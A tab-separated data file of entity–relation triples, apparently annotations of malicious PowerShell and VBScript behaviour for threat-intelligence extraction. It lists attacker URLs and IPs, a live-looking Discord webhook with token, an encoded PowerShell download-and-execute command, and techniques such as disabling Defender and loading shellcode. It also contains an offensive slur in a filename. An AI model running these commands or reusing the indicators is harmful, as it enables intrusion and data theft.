sensitive information	PVI	SentTo	rick63.publicvm.com	URL
The script	SUB	Use	P/Invoke	WAPI
The script	SUB	Execute	function `dischat`	FUNCTION
The script	SUB	Terminate	'javaw'	PROCESS
The script	SUB	Download	https://example.com/file.exe	EXE
file.exe	EXE	Hosted	https://example.com	URL	
The script	SUB	Connect	Discord webhook URL	URL
The script	SUB	Filter	types containing "iUtils"	TYPES
The script	SUB	Load	.NET assembly	ASSEMBLY
scheduled task 'PDF'	TASK	Execute	every 2 minutes	FREQNEUCY
$ErrorActionPreference	PARAMETER	SetTo	SilentlyContinue	PARAMETER VALUE
The script	SUB	Execute	RetrievePassword()	FUNCTION TO COLLECT PVI
The script	SUB	Execute	powershell	PS COMMAND
The script	SUB	Have	-NoExit	BYPASS PARAMETER
asceeeeeeeeeeeeeeee	FUNCTION	Use	Base64 Encoding	OBF
r.exe	EXE	Hosted	http://89.23.98.75:7777/	URL
The script	SUB	Save	shortcut	$uZjpAzXjSE	SHORTCUT
The script	SUB	Execute	remote PowerShell script from 'http://example.com/script.ps1'	REMOTE CODE
C:\Windows\SERVIC~1\MSSQL$~1\AppData\Local\Temp\RJD5UYNO.exe	EXE	Saved	Temporary Folder of MSSQL service	TEMP PATH
The script	SUB	Use	.NET Reflection library	NET REFLECTION LIB	
The script	SUB	Use	WindowsBase .NET assembly	ASSEMBLY
rundll32.exe	EXE	Have	DllRegisterServer	WAPI
GoogleUpdate.ps1	EXE	Hosted	https://invitadoscarlsjr.mx/.POP/.C.jpg	REMOTE FILE
https://invitadoscarlsjr.mx/.POP/.C.jpg	REMOTE FILE	Hosted	https://invitadoscarlsjr.mx	URL
The script	SUB	Wait	start-sleep -s 7	TIME	
The script	SUB	Wait	random delay	TIME
the script	SUB	Use	$sc=SilentlyContinue	SilentlyContinue PARAMETER
The script	SUB	Create	alias "zwert"	ALIAS
The script	SUB	Download	g.exe	EXE
The script	SUB	Execute	Start-Process	COMMAND
VBScript	EXE	Execute	initial PowerShell script	EXE
The script	SUB	Execute	Sleep Commands	SLEEP
The script	SUB	Create	Batch file	EXE
The script	SUB	Connect	45.82.71.119:443	IP
The script	SUB	Execute	File	EXE
the script	SUB	Use	random delay	SLEEP
The script	SUB	Use	Discord API	Discord API
The script	SUB	Encrypt	downloaded data	DATA
The script	SUB	Hide	console window	Console Window
'server.exe'	EXE	Hosted	GitHub	EXTERNAL SERVICE	
The script	SUB	Decode	strings	DATA
$ODW	VAR	Generated	$KEZ	VAR
PowerShell execution policies	PS COMMAND	Have	-w hidden	BYPASS PARAMETER
The script	SUB	Inject	malicious DLL	DLL
The script	SUB	Use	CreateThread	WAPI
scheduled task 'coinmarketcap'	TASK	Execute	every minute	FREQUENCY
The script	SUB	Write	XX.vbs	EXE
The script	SUB	Use	System.Runtime.InteropServices.Marshal::Copy	Marshal::Copy FUNCTION
The script	SUB	Decrypt	p9d2.exe	EXE
long byte sequence	OBF	Execute	IEX	COMMAND
The script	SUB	Execute	PowerShell remoting	PS COMMAND
The script	SUB	Execute	a byte array	OBF
VirtualAlloc	WAPI	Have	dwSize: max($JFmAXPFHnGfI.length, 0x1000)	ADDRESS PARAMETER
The script	SUB	Extract	Set-up.exe	EXE
The script	SUB	Create	Pictures.bat	EXE
The script	SUB	Execute	hidden malicious code	CODE
C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_compiler.exe	EXE	Hosted	Suspicious File Path	PATH	
The script	SUB	Connect	finalsteptogo.com	URL
$env:computername-Capture.png	FILE	Saved	$env:USERPROFILE\AppData\Local\Temp	TEMP PATH
keylogged data	PVI	Saved	$env:temp\keylogger.txt	FILE
start-sleep	COMMAND	Execute	sleep	SLEEP
The script	SUB	Create	new PowerShell session	PROCESS
The script	SUB	Allocate	executable memory	MEMORY
The script	SUB	Have	complex, obfuscated code	OBF
The script	SUB	Use	PowerShell Encoder	OBF
The script	SUB	Replace	'app.asar' file	FILE
base64 encoded string	OBF	Decoded	decrypted byte sequence	DATA
'YWGCNHBTTYGDVSHYYNDAIO.ps1'	EXE	Is	Obfuscated Code	OBF
$Ghost	PARAMETER	Have	byte arrays	DATA	
The script	SUB	Use	WaitForSingleObject	WaitForSingleObject WAPI
scheduled task named "Nothing"	TASK	Execute	every minute	FREQUENCY
the script	SUB	Download	long byte sequence	DATA
long byte sequence	DATA	Hosted	an url	URL
The script	SUB	Use	dynamic code execution	Dynamic code execution ACTION
The script	SUB	Execute	Start-Sleep -Seconds 15	SLEEP
The script	SUB	Have	hardcoded access token	ACCESS TOKEN
Add-Type cmdlet	COMMAND	Load	WindowsBase .NET assembly	NET ASSEMBLY
The script	SUB	Search	non-public, static fields named "Failed"	Non-public FIELD
base64 encoding	OBF	Decoded	a large byte array	DATA
The script	SUB	Create	Win32Functions.EvtrfWgriwFd	FUNCTION with OBF NAME
$screens.Bounds	FUNCTION	Saved	$env:USERPROFILE\AppData\Local\Temp	TEMP PATH
func_get_proc_address	FUNCTION	Retrieve	address of VirtualAlloc	ADDRESS OF WAPI
install.vbs	EXE	Execute	PowerShell commands	PS COMMAND
The script	SUB	Execute	process named 'notice.txt'	PROCESS
P/Invoke	COMMAND	Import	CreateThread	WAPI
The script	SUB	Wait	remote server commands	REMOTE COMMAND
The script	SUB	Execute	Invoke-WebRequest	WebRequest COMMAND
The script	SUB	Modify	HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging	Script Block Logging REGKEY
PowerShell	PS COMMAND	Have	-Verb RunAs	elevated privileges PARAMETER
The script	SUB	Have	Suspicious Twitter accounts	Twitter ACCOUNT
memory (0x3000 bytes)	MEMORY	Load	byte array	DATA
slmgr	COMMAND	Execute	/ipk /skms /ato /xpr	FUNCTION with OBF NAME
The script	SUB	Use	kernel32.dll	DLL
$screens.Bounds	FUNCTION	Write	$env:USERPROFILE\AppData\Local\Temp	TEMP PATH
WD.bat	EXE	Hosted	directory in C:\ProgramData\WD	ProgramData PATH
system information	PVI	Include	antivirus software	DEFENDER INFO
The script	SUB	Decode	base64 string	OBF
The script	SUB	Execute	InvokeSharpHound	COMMAND
The script	SUB	Use	crypt4	OBF
The script	SUB	Decode	long byte sequences	OBF
scheduled task	TASK	Execute	remote connection script	REMOTE CONNECTION
The script	SUB	Execute	document.pdf	FILE
Base64 string	OBF	ConvertedTo	byte array	DATA
The script	SUB	Execute	sleep and retry mechanism	SLEEP
The script	SUB	Delete	related PowerShell history files	FILE
System.Windows.Forms	Windows FORM LIBRARY	Use	Microsoft.Win32.UnsafeNativeMethods	INTERNAL WAPI
The script	SUB	Create	encrypted string	OBF
PowerShell script	SUB	Use	System.Web.HttpUtility.UrlDecodeToBytes	UrlDecodeToBytes Function
WD.vbs	EXE	Hosted	directory in C:\ProgramData\WD	ProgramData PATH
InstallUtil.exe	EXE	Use	Byte Array	DATA
The script	SUB	Collect	Location data	PVI
The script	SUB	Extract	zip file	COMPRESSED FILE
The script	SUB	Execute	schtasks /delete /tn det /f	TASK DELETE COMMAND
The script	SUB	Copy	C:\Users\Administrator\Desktop\backup	ADMINISTRATOR PATH
DLL	OBF	Use	WaitForSingleObject	WaitForSingleObject WAPI
PowerShell	PS COMMAND	Have	Reflective DLL Injection	Reflective DLL Injection ACTION
CreateThread	WAPI	Use	lpThreadAttributes: 0	Security PARAMETER
The script	SUB	Have	$sc variable	VAR
The script	SUB	Encode	contents of Run.BAT	BASE64
The script	SUB	Use	DropBox-Upload function	Upload COMMAND
active window titles	PVI	SentTo	remote server	REMOTE HOST
The script	SUB	Upload	zip file	COMPRESSED FILE
The script	SUB	Delete	WMI event filters and consumers	WMI event filters and consumers	
WebClient	WAPI	Connect	http://146.70.87.120:445/doc	URL
VBScript file WD.vbs	EXE	Execute	batch file WD.bat	EXE
The script	SUB	Create	PowerShell script (JJVXCDAUCHAIHBIEPXDBCS.ps1)	EXE
The script	SUB	Execute	Decrypted command	COMMAND
The script	SUB	Stop	Antivirus services	DEFENDER
mega.zip	FILE	Hosted	https://mega03.b-cdn.net/mega.zip	URL
The script	SUB	Decode	Base64	OBF
VBScript file	EXE	Execute	PowerShell script	EXE
VBScript	EXE	Execute	WD.bat	EXE
The script	SUB	Connect	external server	REMOST HOST
The script	SUB	Check	IntPtr size	POINTER SIZE
The script	SUB	Creates	new thread	THREAD
The script	SUB	Have	-Ep bypass	BYPASS PARAMETER
the script	SUB	Collect	current Username	PVI
file.exe	EXE	Hosted	https://example.com/file.exe	URL
Scheduled Task	TASK	Execute	VsLabs.vbs	EXE
CreateThread	WAPI	Have	lpParameter: 0	NULL lpParameter PARAMETER
Shell.Application	COM	Execute	Insidious.exe	EXE
the script	SUB	Have	infinite loop	LOOP
The script	SUB	Disable	Behavior Monitoring	DEFENDER
khle.exe	EXE	Execute	conhost.exe	EXE
The script	SUB	Use	Invoke-Expression (IEX)	IEX COMMAND
The script	SUB	Connect	cdn3.space	EXTERNAL SERVICE
The script	SUB	Access	user's Documents	PVI
The script	SUB	Connect	/log.php	EXTERNAL SERVICE
IEX	COMMAND	Execute	a base64 encoded PowerShell script	OBF EXE
The script	SUB	Have	Obfuscated Code	OBF
The script	SUB	Define	custom function go	FUNCTION
The script	SUB	Contain	Base64-encoded payload	OBF
The script	SUB	Load	assembly from base64 string	ASSEMBLY
The script	SUB	Deletes	Temporary PowerShell Scripts	TEMP FILE
The script	SUB	Have	Obfuscation	OBF
XX.bat	EXE	Execute	PowerShell scripts	EXE
TvMusic.vbs	EXE	Have	base64 encoded string	OBF
Cookie header	COOKIE	Have	encoded data	ENCODED DATA
QPXCNKQPGRJWIWPIQLPDOP.bat	EXE	Execute	NHCIYUEGJZVIPHCJBJRIOD.ps1	EXE
VirtualAlloc	WAPI	Create	memory	MEMORY
memory created by VirtualAlloc	MEMORY	Load	$GvyxHVFaoQz	OBF
The script	SUB	OBF	complex encoding scheme	OBF
IEX	COMMAND	Execute	note.jpg	FILE
specific file types	DATA	Include	wallet files	DATA
The script	SUB	Create	scheduled task 'chrome_elf'	TASK
The script	SUB	Create	mvfp.vbs	EXE
The script	SUB	Obfuscate	Base64 Encoding	OBF
The script	SUB	Execute	mezzanines.dll	DLL
1.exe	EXE	Hosted	http://185.244.11.103	URL
The script	SUB	Download	1.exe	EXE
addresses	ADDRESS	Saved	decoded byte sequence	DATA
The script	SUB	Replace	specific strings	STRING
VBScript coinmarketcap.vbs	EXE	Execute	batch file 1.bat	EXE
CallByName	WAPI	Use	Reflective DLL Injection	Reflective DLL Injection
The script	SUB	Encrypt	files in the user's Downloads folder	FILE
The script	SUB	Execute	powershell.exe	PS COMMAND
scheduled task (TvMusic2)	TASK	Create	every 2 minutes, starting from January 1, 2023	FREQUENCE
The script	SUB	Load	assembly codes from byte array	CODE
The script	SUB	Creates	delegate for VirtualAlloc Function	DELEGATE
delegate	DELEGATE	ReferTo	VirtualAlloc	WAPI
The script	SUB	Use	-NOP -WND HIDDEN	BYPASS PARAMETER
The script	SUB	Execute	while ($TimesToRun -gt $Runner)	LOOP
The script	SUB	Create	dynamic delegate	DYNAMIC DELEGATE
Run.BAT	FILE	Saved	C:\Users\Public\Run\	PATH
The Script	SUB	Access	C:\Users\Public\Videos	PATH
PowerShell command	PS COMMAND	Have	-ExecutionPolicy Bypass	PARAMETER
scheduled task	TASK	Execute	VBScript (JJVXCDAUCHAIHBIEPXDBCS.vbs)	EXE
The script	SUB	Create	libraries.bat	EXE
data.txt	FILE	Read	Base64-encoded string	OBF
The script	SUB	Execute	'ngrok.exe'	EXE
The script	SUB	Execute	'server.exe'	EXE
The script	SUB	Execute	-EXEC Bypass	BYPASS PARAMETER
The script	SUB	Execute	Marshal.Copy	Marshal::Copy WAPI
CreateThread	WAPI	Create	Thread	THREAD
Thread	THREAD	Execute	$hnzVudhxc	OBF
The script	SUB	Execute	encoded PowerShell code	OBF EXE
batch file	EXE	Execute	initial PowerShell script	EXE
The script	SUB	Execute	WaitForSingleObject	WaitForSingleObject ACTION
The script	SUB	Modify	LONG_BYTE_SEQUENCE	DATA
cookies	COOKIE	SetTo	random value	RANDOM VALUE
Set-MpPreference	COMMAND	Disable	Windows Defender real-time scanning	DEFENDER
Start-Job	COMMAND	Create	a background job	BACKGROUND JOB
The script	SUB	Access	caspol.exe	EXE
Start-Job	COMMAND	Have	parameter -RunAs32	RunAs32 PARAMETER
The script	SUB	Have	base64 encoding and hexadecimal values	OBF
RetrieveAll()	Function	Collect	passwords	PVI
The script	SUB	Execute	with elevated privileges	PRIVILEGE ESCALATE
kematian.bin	EXE	Hosted	https://github.com/Somali-Devs/Kematian-Stealer/releases/download/KematianBuild/kematian.bin	URL
The script	SUB	Download	kematian.bin	EXE
The script	SUB	Load	System.Reflection.Assembly::Load	Reflection.Assembly WAPI
The script	SUB	Connect	http://50.62.182.1/contadores/index.php	URL
The script	SUB	Execute	32-bit job	32-bit JOB
allocated memory	MEMORY	Load	modified byte sequence	DATA
PowerShell script	EXE	Encrypt	Base64	OBF
The script	SUB	Use	PowerShell Reflection	Powershell Reflection
The script	SUB	Use	simple encryption algorithm	ALGORITHM
The script	SUB	Execute	csc.exe	EXE
The script	SUB	Use	WaitForSingleObject	WaitForSingleObject WAPI
The script	SUB	Copy	decoded byte sequence	DATA
The script	SUB	Collect	System's default credentials	PVI
The script	SUB	Delete	Itself and related files	FILE
The script	SUB	Decode	base64 encoded string	OBF
The script	SUB	Execute	Start-Sleep commands	SLEEP
PowerShell	PS COMMAND	Have	/w 1	BYPASS PARAMETER
CallByName	FUNCTION	From	Microsoft.VisualBasic.Interaction	LIBRARY
The script	SUB	Execute	New-Object	COMMAND
The script	SUB	Use	Invoke-WebRequest	COMMAND
The script	SUB	Delete	temporary directory	TEMP PATH
The script	SUB	Have	base64-encoded string	OBF
The script	SUB	Use	VirtualAlloc	WAPI
The script	SUB	Have	$ErrorActionPreference = 'SilentlyContinue'	SilentlyContinue PARAMETER
The script	SUB	Execute	Invoke-RestMethod cmdlet	COMMAND
The script	SUB	Delete	C:\Temp\file.ps1	TEMP FILE
C:\Temp\file.ps1	TEMP FILE	Is	ps file	EXE
The script	SUB	Create	x.ps1	EXE
The script	SUB	Import	native functions from kernel32.dll	WAPI
The script	SUB	Create	new process	PROCESS
The script	SUB	Access	user's Desktop	Desktop PATH
The script	SUB	Clear	command history	Command history
The script	SUB	Execute	WebClient	WebClient WAPI
a file in C:\ProgramData	FILE	Saved	C:\ProgramData	ProgramData PATH
The script	SUB	Create	VBScript	EXE
The script	SUB	Execute	RegSvcs.exe	RegSvcs EXE
stealthy operations	ACTION	Include	looping through objects	LOOP
The script	SUB	Have	Hardware breakpoints	BREAKPOINT	
Hardware breakpoints	BREAKPOINT	Change	the execution flow of the script	EXECUTION FLOW
The script	SUB	Collect	unique AES key	PVI
Base64 Encoding	OBF	Have	PowerShell command	PS COMMAND
The script	SUB	Create	cxPsePvskG.SzmjCGUmQG.UskNSZSKwZTHwVAVuaUfdymHT	OBF
The script	SUB	Use	GZip	COMPRESSED TOOL
Set-MpPreference	COMMAND	Add Exclusion	.exe and .dll files	EXE
specific key presses	Keyboard EVENT	Include	Ctrl + Ctrl	Keyboard EVENT
1.bat	EXE	Execute	dlqp.ps1	EXE
The script	SUB	Send	current working directory	PVI
The script	SUB	Create	$env:TMP\BrowserData.txt	FILE
$env:TMP\BrowserData.txt	FILE	Saved	$env:TMP	TEMP PATH
new thread	THREAD	Execute	shellcode	EXE
The script	SUB	Execute	VirtualAlloc	WAPI
The script	SUB	Use	IEX New-Object	New-Object COMMAND
Discord webhook	WEBHOOK	Hosted	https://discord.com/api/webhooks/1130780253049081958/cvtl8Oe_E2jfLSgeZ-hlORSj8lneLIMdS4efuyG27PKie0Nxsiscpaj_UL5_AuKAYZfb	URL
Registry modification	RegKey	Load	non-existent DLL	DLL
scheduled task	TASK	Have	TaskTrigger	LOOP
The script	SUB	Connect	Telegram channel	EXTERNAL SERVICE
Command-Line Arguments	PARAMETER	Refer to	C:\ProgramData\GTZYVDQNGLKWWAYUCNKYHE\GTZYVDQNGLKWWAYUCNKYHE.bat	EXE
The script	SUB	Execute	while loop	LOOP
The script	SUB	Execute	Add-Type cmdlet	COMMAND
Add-Type cmdlet	WAPI	Used for	Unmanaged Code	CODE
The script	SUB	Download	Sursdepa.vbs	EXE
The script	SUB	Create	nipplesnigger	FILE
The script	SUB	Have	Base64 Encoded Binary Data	OBF
The script	SUB	Check	running as 'SYSTEM' user	PRIVILEDGE
The script	SUB	Use	Reflection.Assembly::Load()	Reflection.Assembly WAPI
$env:TMP\BrowserData.txt	FILE	Uploaded	Discord EXTERNAL	URL
Add-Type cmdlet	COMMAND	Load	System.Drawing	LIBRARY
The script	SUB	Create	Run.vbs	EXE
The script	SUB	Create	delegate for Function at memory address	DELEGATE
The script	SUB	Execute	the same obfuscated code	LOOP
The script	SUB	Create	'mercifulHaddock.txt'	FILE
The script	SUB	Decode	Base64 Strings	OBF
The script	SUB	Download	http://110.42.135.208:64962/image/22.jpg	FILE
Invoke-Expression	COMMAND	Execute	arbitrary code	CODE
The script	SUB	Create	C:\ProgramData\JJVXCDAUCHAIHBIEPXDBCS	ProgramData PATH
THe script	SUB	Create	new registry key and value	REGKEY
The script	SUB	Write	.ps1	EXE
The script	SUB	Connect	https://clk-info.ru	URL
The script	SUB	Suppress	Error message	Error message
the script	SUB	Have	infinite loop	LOOP
WD.PS1	EXE	Saved	directory in ProgramData	ProgramData PATH
delegate zV2s3	DELEGATE	Call	VirtualProtect	WAPI
The script	SUB	Check	PowerShell version >= 5.1	Powershell version	
The script	SUB	Disable	Script Block Invocation Logging	Script Block Logging
Disable Script Block Invocation Logging	Disable Script Block Logging	Have	PowerShell version >= 5.1	CONDITION
libraries.bat	EXE	Hosted	libraries.ps1	EXE
The script	SUB	Create	batch file	EXE
The script	SUB	Load	PresentationCore .NET assembly	NET ASSEMBLY
The script	SUB	Use	ASCII values	OBF
vbs files	EXE	Hosted	C:\ProgramData\WD	ProgramData PATH
multiple files	FILE	Hosted	C:\ProgramData\QYZZDAOKPZUJIKAFEZWZDV	ProgramData PATH
WebClient object	WebClient OBJECT	Have	default web proxy	WebProxy
The script	SUB	Read	Decompressed stream	DATA
tr.zip	COMPRESSED FILE	Saved	$pzip	PATH
The script	SUB	Execute	WD.PS1	EXE
The script	SUB	Create	scheduled task named log	TASK
CgKYDo.exe	EXE	Saved	temp path	TEMP PATH
The script	SUB	Execute	obfuscated code	OBF CODE
The script	SUB	Copy	$ZPWeIhCk	VAR
multiple files	FILE	Hosted	C:\ProgramData	ProgramData PATH
The script	SUB	Modify	registry	RegKey
The script	SUB	Create	VBScript	EXE
The script	SUB	Delete	MINGALIES	PATH
powershell scripts	PS COMMAND	Have	-sta	-sta PARAMETER
decoded string	DATA	SentTo	System.IO.Compression.DeflateStream	COMPRESSION WAPI
The script	SUB	Execute	6317a573893bde4aeea7e18e	FILE
ps1 files	EXE	Hosted	C:\ProgramData\WD	ProgramData	ProgramData PATH	
System information	PVI	Include	email	PVI
The script	SUB	Execute	Receive-Job -Wait	COMMAND
The script	SUB	Have	Obfuscated code	OBF
The script	SUB	Create	multiple URLs	URL
The script	SUB	Load	VirtualAlloc	WAPI
WBPWTLJYGIAVQRJESQDYHO.ps1	EXE	Hosted	C:\ProgramData\YWGCNHBTTYGDVSHYYNDAIO	ProgramData PATH
$RecentGranita	VAR	Decoded	.NET assembly	NET ASSEMBLY
thukanthukai.~!!@@!!@@!!~	FILE	Have Name	random strings	RANDNAME
method 'Execute'	FUNCTION	RECEIVE	decoded byte array	DATA
The script	SUB	Use	Reflection.Assembly.Load	Reflection.Assembly.Load WAPI
VBScript file (Nothing.vbs)	EXE	Execute	batch file (1.bat)	EXE
The script	SUB	Wait	15 seconds	TIME
delegate	DELEGATE	ReferTo	allocated memory	MEMORY
The script	SUB	Have	-WindowStyle Hidden	BYPASS PARAMETER
C:\Users\Public\Run\Run.vbs	EXE	Execute	PowerShell commands	PS COMMAND
log.ps1	EXE	Saved	hidden directory	HIDDEN PATH
The script	SUB	Create	files in C:\Users\Public\coinmarketcap	FILE
The script	SUB	Download	http://checkblacklistwords.eu/words.txt	FILE
http://checkblacklistwords.eu/words.txt	FILE	Hosted	http://checkblacklistwords.eu	URL	
The script	SUB	Have	ASCII encoding	OBF
The script	SUB	Encrypt	Base64 Encoded Command	OBF
computer names or IP addresses	PVI	Saved	comps*	FILE
khle.mp3	FILE	RenamedTo	khle.exe	EXE
The script	SUB	Connect	10.18.1.77:4444	IP ADDRESS
byte array	DATA	ConvertedTo	PowerShell code	CODE
Invoke-WebRequest	COMMAND	Output	-OutFile	C:\Temp\file.ps1	EXE
C:\Temp\file.ps1	EXE	Saved	C:\Temp	TEMP PATH
The script	SUB	Have	-Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBjAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AYgBhAHMAZQBsAGkAbgBlAC4AdABvAHAALwBpAG4AZABlAHgALgBwAGgAcAAiACkA	OBF PARAMETER
The script	SUB	Execute	PowerShell	EXE
The script	SUB	Create	temporary folder	TEMP PATH
shellcode	CODE	Hosted	memory region	MEMORY
The script	SUB	Create	a new thread	THREAD
VBoxSVC.exe	EXE	Extract	2.tar	COMPRESSED FILE
The script	SUB	Use	System.Net.WebClient	WebClient WAPI
The script	SUB	Create	WD.vbs	EXE
The script	SUB	Send	result of executed command	PVI
The script	SUB	Access	user's local app data folder	USER APPDATA PATH
Loader.vbs	EXE	Execute	PowerShell scripts	EXE
The script	SUB	Execute	byte array as code	DATA
ONEN0TEupdate	Suspicious REGKEY Value	Located	HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run	AUTORUN REGKEY
The script	SUB	Add Exclusion	temporary directory	TEMP PATH
RCPWUCPIOIVAIRTEYOOWAA	FUNCTION	Dencrypt	long byte sequence	OBF
The script	SUB	Execute	NS2.exe	EXE
The script	SUB	Use	Triple DES encryption	ENCRYPTION
The script	SUB	Allocate	executable memory	MEMORY
CodeDom function	FUNCTION	Execute	.NET assembly	NET ASSEMBLY
The script	SUB	Decode	encoded strings	DATA
The script	SUB	Download	Isass.exe	EXE
The script	SUB	Use	obfuscated code	OBF
The script	SUB	Download	http://54.212.206.189/S%!h%rv%!h%rBSTBBB.txt	FILE
http://54.212.206.189/S%!h%rv%!h%rBSTBBB.txt	FILE	Hosted	http://54.212.206.189	URL	
The script	SUB	Use	Start-Sleep cmdlet	SLEEP
The script	SUB	Create	registry key	REGKEY
The script	SUB	Have	:sl while($true)	LOOP
The script	SUB	Save	install.vbs	EXE
XX.bat	EXE	Saved	directory in C:\ProgramData\WD	ProgramData PATH
the script	SUB	Use	Add-Type cmdlet	Add-Type COMMAND
The script	SUB	Have	decoders	Decode FUNCTION
scheduled task	TASK	Execute	every 2 minutes	FREQUENCY
The script	SUB	Execute	XOR operation	Encryption
The script	SUB	Use	Remove-Encryption function	Remove-Encryption COMMAND
tr.zip	COMPRESSED FILE	Saved	$path	PATH
The script	SUB	Have	XOR Decryption	OBF
The script	SUB	Have	Obfuscated and Encrypted Strings	OBF
Base64 Encoded Data	OBF	Hosted	JPEG image	FILE
netsh	COMMAND	Collect	saved Wi-Fi profiles	PVI
The script	SUB	Download	1201.rar	COMPRESSED FILE
GetAsyncKeyState	WAPI	Monitor	key presses	KEYBOARD EVENT
Decoded string	DATA	Have	powershell.exe -NoProfile -ExecutionPolicy Bypass -Command	PS COMMAND
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command	PS COMMAND	Have	-NoProfile -ExecutionPolicy Bypass -Command	BYPASS PARAMETER	
The script	SUB	Terminate	FoxitPDFReader	PROCESS
data	DATA	Loaded	executable memory	MEMORY
The script	SUB	Check	Trezor folder	PATH
The script	SUB	Execute	remote script	REMOTE CODE
text file	FILE	Saved	temporary directory	TEMP PATH
decoded string	DATA	Have	dynamic .NET type	DYNAMIC NET TYPE
shove.ke	FILE	Loaded	memory	MEMORY
The script	SUB	Use	Base64 encoding	OBF
remote script	REMOTE CODE	Download	hxxp://example.com/script1.ps1	EXE
hxxp://example.com/script1.ps1	EXE	Hosted	hxxp://example.com	URL	
install.vbs	EXE	Execute	CreateObject("WScript.Shell")	WScript.Shell OBJECT
The script	SUB	Delete	temporary files and folders	TEMP PATH
The script	SUB	Use	base64 encoding	OBF
The script	SUB	Read	t.png	FILE
complex string manipulation	OBF	Have	sv and gv cmdlets	COMMAND
The script	SUB	Execute	EntryPoint method	EntryPoint
The script	SUB	Compress	contents of the temporary directory	DATA
The script	SUB	Have	complex obfuscation technique	OBF
The script	SUB	Use	Start-Sleep	SLEEP
script	SUB	Execute	Rundll32	DLL
Marshal::Copy	Marshal::Copy WAPI	CalledWith	$JFmAXPFHnGfI to allocated memory	PARAMETER
$JFmAXPFHnGfI to allocated memory	PARAMETER	ReferTo	$JFmAXPFHnGfI	DATA
The script	SUB	Execute	mshta.exe	EXE
infinite loop	LOOP	Breaks On	cmd.exe process exit	EVENT
XOR encrypted data	OBF	Saved	the cookie	COOKIE
PowerShell script	EXE	Create	JZKPPKGTHBOIPSRKOCOKSH.vbs	EXE
$WebFile	PARAMETER	ReferTo	http://62.182.84.61/4563636/Updater.exe	EXE
The script	SUB	Read	C:\Users\pwced85\AppData\Roaming\micROSoft\RETJSsvHlCw\ESUzouZqkfPhBIgAtN.OfsSLlxztCh	FILE
C:\Users\pwced85\AppData\Roaming\micROSoft\RETJSsvHlCw\ESUzouZqkfPhBIgAtN.OfsSLlxztCh	FILE	Saved	AppData	USER APPDATA PATH
custom function	FUNCTION	Decode	encoded byte sequences	OBF
The script	SUB	Have	XOR encryption	OBF
CreateThread	WAPI	Create	a new thread	THREAD
The script	SUB	Download	item.dat	DATA
Files	FILE	Hosted	Windows system directory and en-US subdirectory	SYSTEM PATH
The script	SUB	Access	memory	MEMORY
oil.exe	EXE	Hosted	http://198.23.212.192/inv/oil.exe	URL
The script	SUB	Encrypt	hexadecimal string	OBF
hidden directory	HIDDEN PATH	Hosted	x.ps1	EXE
long byte sequences	OBF	Converted	.ps1 files	EXE
shortcut	SHORTCUT	Saved	user's local app data folder	APPDATA PATH
The script	SUB	Have	-ep bypass	BYPASS PARAMETER
System information	PVI	Include	PC name	PVI
complete command	COMMAND	Download	note.jpg	FILE
start-sleep	COMMAND	Have	7 seconds	TIME
script	SUB	Execute	Start-Process	START PROCESS COMMAND
Start-Process	START PROCESS COMMAND	Have	WindowStyle Hidden	BYPASS PARAMETER
The script	SUB	Download	https://example.com/evil.exe	EXE
The script	SUB	Execute	New.BAT	EXE
'New.vbs'	EXE	Hosted	'C:\Users\Public\Run'	PATH
The script	SUB	Have	Invoke-Expression (IEX)	IEX COMMAND
user's clipboard	PVI	Uploaded	Discord webhook	WEBHOOK
The script	SUB	Collect	standard input, output, error data	DATA
login data file	FILE	SentTo	Discord webhook	WEBHOOK
base64 string	OBF	ConvertedTo	byte array	DATA
compressed data	COMPRESSED DATA	DecompressedTo	payload	DATA
HKCU:\Software\Microsoft\Windows\CurrentVersion\Run	AUTORUN REGKEY	SetTo	'C:\a\r.exe'	EXE
The script	SUB	Have	hardcoded credentials	credential
The script	SUB	Create	1.bat	EXE
PowerShell script	EXE	Saved	C:\ProgramData\GRYOJAPQWXHAESUEWDUYNV\NLCBVGPTEAPNTYEQVILCON.ps1	ProgramData PATH
The script	SUB	Use	VirtualAlloc	WAPI
The script	SUB	Delete	tr.zip	COMPRESSED FILE
PowerShell	PS COMMAND	Have	-w 1	BYPASS PARAMETER
The script	SUB	Ignore	Digital Signature Verification	Digital Signature Verification
